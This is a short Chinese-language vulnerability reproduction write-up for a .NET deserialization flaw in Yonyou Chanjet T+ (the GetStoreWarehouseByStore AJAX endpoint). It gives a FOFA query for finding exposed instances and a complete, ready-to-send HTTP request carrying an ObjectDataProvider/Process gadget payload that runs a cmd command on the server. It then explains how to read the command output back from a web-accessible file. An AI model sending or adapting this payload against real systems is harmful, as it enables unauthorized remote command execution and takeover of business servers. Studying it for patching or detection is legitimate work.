## 漏洞简介
用友 畅捷通T+ GetStoreWarehouseByStore 存在 .net反序列化漏洞，导致远程命令执行，控制服务器
## 漏洞复现
fofa语法：app="畅捷通-TPlus"
登录页面如下：
![](https://cdn.nlark.com/yuque/0/2024/png/40540518/1718718019880-8e3ef046-73e2-4b81-bb82-5ee0ba4b3a64.png#averageHue=%23a7ada7&clientId=uc19d1755-dd62-4&from=paste&id=u430ad7d8&originHeight=883&originWidth=1610&originalType=url&ratio=1.25&rotation=0&showTitle=false&status=done&style=none&taskId=u07b99bd6-15e3-4a05-bce7-413683f8327&title=)
POC：
```makefile
POST /tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
X-Ajaxpro-Method: GetStoreWarehouseByStore
Host: 
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
Content-type: application/x-www-form-urlencoded
Content-Length: 577

{
  "storeID":{
    "__type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
    "MethodName":"Start",
    "ObjectInstance":{
        "__type":"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
        "StartInfo": {
            "__type":"System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
            "FileName":"cmd", "Arguments":"/c whoami > test.txt"
        }
    }
  }
}
```
![](https://cdn.nlark.com/yuque/0/2024/png/40540518/1718718019689-f83bdd6f-d7e2-45b5-ad38-fc6908c48560.png#averageHue=%23fbfafa&clientId=uc19d1755-dd62-4&from=paste&id=uc62af326&originHeight=635&originWidth=1109&originalType=url&ratio=1.25&rotation=0&showTitle=false&status=done&style=none&taskId=uf248781f-f3c3-4d3d-a9a1-f5e0cdd2838&title=)

访问/tplus/test.txt文件，查看命令执行结果
![](https://cdn.nlark.com/yuque/0/2024/png/40540518/1718718019802-afdad0d2-5f80-4489-b899-5ef2b403bf96.png#averageHue=%23f9f9f9&clientId=uc19d1755-dd62-4&from=paste&id=uc36faeee&originHeight=357&originWidth=1122&originalType=url&ratio=1.25&rotation=0&showTitle=false&status=done&style=none&taskId=u3da288c2-6499-4726-8f32-20aa6d36630&title=)
## 




